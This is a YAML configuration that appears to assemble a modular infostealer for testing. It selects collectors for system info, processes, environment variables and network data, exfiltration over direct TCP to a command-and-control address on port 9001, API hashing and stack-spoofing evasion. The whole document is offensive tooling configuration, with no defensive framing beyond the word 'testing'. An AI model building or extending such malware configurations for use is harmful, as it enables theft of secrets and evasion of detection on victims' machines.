name: infostealer_test_clean
description: Clean infostealer for testing - only enabled chunks
core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops
collectors:
  - collectors/system_info
  - collectors/processes
  - collectors/env_vars
  - collectors/netinfo_api
exfil: exfil/tcp_direct
arch: arch/sequential
resources: true
api_resolve: api_resolve/api_hash_djb2
evasion:
  - evasion/stack_spoof
vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
